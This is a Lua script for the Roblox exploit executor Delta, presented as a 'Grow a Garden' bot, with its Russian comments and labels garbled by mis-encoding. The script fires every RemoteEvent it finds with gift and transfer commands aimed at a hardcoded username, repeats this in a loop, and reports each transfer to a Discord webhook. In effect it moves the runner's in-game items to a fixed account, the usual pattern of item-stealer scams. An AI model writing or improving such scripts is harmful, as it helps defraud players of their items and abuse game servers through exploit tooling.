--[[
    üåø GROW A GARDEN BOT –¥–ª—è Delta Executor
    –£–ø—Ä–æ—â–µ–Ω–Ω–∞—è –∏ —Ä–∞–±–æ—á–∞—è –≤–µ—Ä—Å–∏—è
]]

-- ===== –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–Ø =====
local TARGET_USERNAME = "Sgahfd1223"
local WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token"
local CHECK_INTERVAL = 30

-- ===== –°–ï–†–í–ò–°–´ =====
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

-- ===== –ü–ï–†–ï–ú–ï–ù–ù–´–ï =====
local LocalPlayer = Players.LocalPlayer
local BotEnabled = false
local AttemptCount = 0
local SuccessCount = 0

-- ===== –ü–†–û–°–¢–û–ô –õ–û–ì–ì–ï–† =====
local function log(message)
    print("[Garden Bot] " .. message)
end

-- ===== –ü–û–ò–°–ö REMOTE EVENTS =====
local function findRemotes()
    local remotes = {}
    
    -- –ü–æ–∏—Å–∫ –≤ ReplicatedStorage
    pcall(function()
        for _, item in ipairs(ReplicatedStorage:GetDescendants()) do
            if item:IsA("RemoteEvent") then
                table.insert(remotes, item)
            end
        end
    end)
    
    -- –ü–æ–∏—Å–∫ –≤ ServerScriptService
    pcall(function()
        local ss = game:GetService("ServerScriptService")
        for _, item in ipairs(ss:GetDescendants()) do
            if item:IsA("RemoteEvent") then
                table.insert(remotes, item)
            end
        end
    end)
    
    return remotes
end

-- ===== –ü–û–ò–°–ö –¶–ï–õ–ï–í–û–ì–û –ò–ì–†–û–ö–ê =====
local function findTargetPlayer()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name:lower() == TARGET_USERNAME:lower() then
            return player
        end
    end
    return nil
end

-- ===== –ü–ï–†–ï–î–ê–ß–ê –ü–†–ï–î–ú–ï–¢–û–í =====
local function transferItems(targetPlayer)
    if not targetPlayer then return 0 end
    
    local remotes = findRemotes()
    local transferred = 0
    
    for _, remote in ipairs(remotes) do
        -- –ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ –º–µ—Ç–æ–¥—ã –ø–µ—Ä–µ–¥–∞—á–∏
        local methods = {
            "GiftAll", "TransferAll", "SendAll", 
            "DonateAll", "TradeAll", "GiveAll"
        }
        
        for _, method in ipairs(methods) do
            local success = pcall(function()
                remote:FireServer(method, targetPlayer)
                return true
            end)
            
            if success then
                transferred = transferred + 1
                task.wait(0.2)
            end
        end
    end
    
    return transferred
end

-- ===== –û–¢–ü–†–ê–í–ö–ê DISCORD –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø =====
local function sendDiscordNotification(targetPlayer, transferred)
    if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
    
    local payload = {
        embeds = {{
            title = "üåø Garden Bot Notification",
            description = "–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø–µ—Ä–µ–¥–∞—á–∞ –ø—Ä–µ–¥–º–µ—Ç–æ–≤",
            color = 65280,
            fields = {
                {
                    name = "üë§ –û—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—å",
                    value = LocalPlayer.Name,
                    inline = true
                },
                {
                    name = "üéØ –ü–æ–ª—É—á–∞—Ç–µ–ª—å", 
                    value = targetPlayer.Name,
                    inline = true
                },
                {
                    name = "üì¶ –ü–µ—Ä–µ–¥–∞–Ω–æ",
                    value = transferred .. " –ø—Ä–µ–¥–º–µ—Ç–æ–≤",
                    inline = true
                }
            },
            footer = {
                text = "Grow a Garden Bot | Delta Executor"
            }
        }}
    }
    
    pcall(function()
        local json = HttpService:JSONEncode(payload)
        game:HttpGet(WEBHOOK_URL .. "?wait=true", {
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = json
        })
    end)
end

-- ===== –°–û–ó–î–ê–ù–ò–ï –ü–†–û–°–¢–û–ì–û GUI =====
local function createSimpleGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "GardenBotGUI"
    screenGui.Parent = game:GetService("CoreGui")
    
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(0, 300, 0, 200)
    mainFrame.Position = UDim2.new(0.5, -150, 0, 20)
    mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 8)
    corner.Parent = mainFrame
    
    -- –ó–∞–≥–æ–ª–æ–≤–æ–∫
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 40)
    title.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    title.BorderSizePixel = 0
    title.Text = "üåø Garden Bot"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Font = Enum.Font.GothamBold
    title.Parent = mainFrame
    
    local titleCorner = Instance.new("UICorner")
    titleCorner.CornerRadius = UDim.new(0, 8)
    titleCorner.Parent = title
    
    -- –ö–æ–Ω—Ç–µ–Ω—Ç
    local content = Instance.new("Frame")
    content.Size = UDim2.new(1, -20, 1, -60)
    content.Position = UDim2.new(0, 10, 0, 50)
    content.BackgroundTransparency = 1
    content.Parent = mainFrame
    
    -- –°—Ç–∞—Ç—É—Å
    local status = Instance.new("TextLabel")
    status.Size = UDim2.new(1, 0, 0, 30)
    status.Text = "–°—Ç–∞—Ç—É—Å: –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"
    status.TextColor3 = Color3.fromRGB(255, 80, 80)
    status.TextSize = 16
    status.Font = Enum.Font.GothamBold
    status.Parent = content
    
    -- –¶–µ–ª—å
    local target = Instance.new("TextLabel")
    target.Size = UDim2.new(1, 0, 0, 20)
    target.Position = UDim2.new(0, 0, 0, 30)
    target.Text = "–¶–µ–ª—å: " .. TARGET_USERNAME
    target.TextColor3 = Color3.fromRGB(200, 200, 200)
    target.TextSize = 14
    target.Font = Enum.Font.Gotham
    target.Parent = content
    
    -- –ö–Ω–æ–ø–∫–∏
    local startBtn = Instance.new("TextButton")
    startBtn.Size = UDim2.new(1, 0, 0, 35)
    startBtn.Position = UDim2.new(0, 0, 0, 60)
    startBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
    startBtn.BorderSizePixel = 0
    startBtn.Text = "‚ñ∂Ô∏è –ó–ê–ü–£–°–¢–ò–¢–¨"
    startBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    startBtn.TextSize = 16
    startBtn.Font = Enum.Font.GothamBold
    startBtn.Parent = content
    
    local stopBtn = Instance.new("TextButton")
    stopBtn.Size = UDim2.new(1, 0, 0, 35)
    stopBtn.Position = UDim2.new(0, 0, 0, 100)
    stopBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
    stopBtn.BorderSizePixel = 0
    stopBtn.Text = "‚èπÔ∏è –û–°–¢–ê–ù–û–í–ò–¢–¨"
    stopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    stopBtn.TextSize = 16
    stopBtn.Font = Enum.Font.GothamBold
    stopBtn.Parent = content
    
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 6)
    btnCorner.Parent = startBtn
    btnCorner:Clone().Parent = stopBtn
    
    return {
        Gui = screenGui,
        Status = status,
        StartBtn = startBtn,
        StopBtn = stopBtn
    }
end

-- ===== –û–°–ù–û–í–ù–ê–Ø –§–£–ù–ö–¶–ò–Ø =====
local function mainLoop()
    while BotEnabled do
        AttemptCount += 1
        log("–ü–æ–∏—Å–∫ –∏–≥—Ä–æ–∫–∞ " .. TARGET_USERNAME)
        
        local targetPlayer = findTargetPlayer()
        
        if targetPlayer then
            log("–ù–∞–π–¥–µ–Ω –∏–≥—Ä–æ–∫: " .. targetPlayer.Name)
            
            -- –ü–µ—Ä–µ–¥–∞—á–∞ –ø—Ä–µ–¥–º–µ—Ç–æ–≤
            local transferred = transferItems(targetPlayer)
            
            if transferred > 0 then
                SuccessCount += 1
                log("–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω–æ: " .. transferred .. " –ø—Ä–µ–¥–º–µ—Ç–æ–≤")
                
                -- –û—Ç–ø—Ä–∞–≤–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
                sendDiscordNotification(targetPlayer, transferred)
            else
                log("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø—Ä–µ–¥–º–µ—Ç—ã")
            end
        else
            log("–ò–≥—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω")
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- ===== –ò–ù–ò–¶–ò–ê–õ–ò–ó–ê–¶–ò–Ø =====
log("Garden Bot –∑–∞–≥—Ä—É–∂–∞–µ—Ç—Å—è...")

-- –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ –∏–≥—Ä—ã
if not game:IsLoaded() then
    game.Loaded:Wait()
end

if not Players.LocalPlayer then
    Players.PlayerAdded:Wait()
end

task.wait(2)

-- –°–æ–∑–¥–∞–Ω–∏–µ GUI
local gui = createSimpleGUI()

-- –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–Ω–æ–ø–æ–∫
gui.StartBtn.MouseButton1Click:Connect(function()
    if not BotEnabled then
        BotEnabled = true
        gui.Status.Text = "–°—Ç–∞—Ç—É—Å: –†–∞–±–æ—Ç–∞–µ—Ç"
        gui.Status.TextColor3 = Color3.fromRGB(80, 200, 120)
        log("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω")
        
        -- –ó–∞–ø—É—Å–∫ –æ—Å–Ω–æ–≤–Ω–æ–≥–æ —Ü–∏–∫–ª–∞
        spawn(mainLoop)
    end
end)

gui.StopBtn.MouseButton1Click:Connect(function()
    if BotEnabled then
        BotEnabled = false
        gui.Status.Text = "–°—Ç–∞—Ç—É—Å: –û—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω"
        gui.Status.TextColor3 = Color3.fromRGB(200, 80, 80)
        log("–ë–æ—Ç –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω")
    end
end)

log("–ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")
log("–¶–µ–ª–µ–≤–æ–π –∏–≥—Ä–æ–∫: " .. TARGET_USERNAME)

return "GARDEN_BOT_READY"
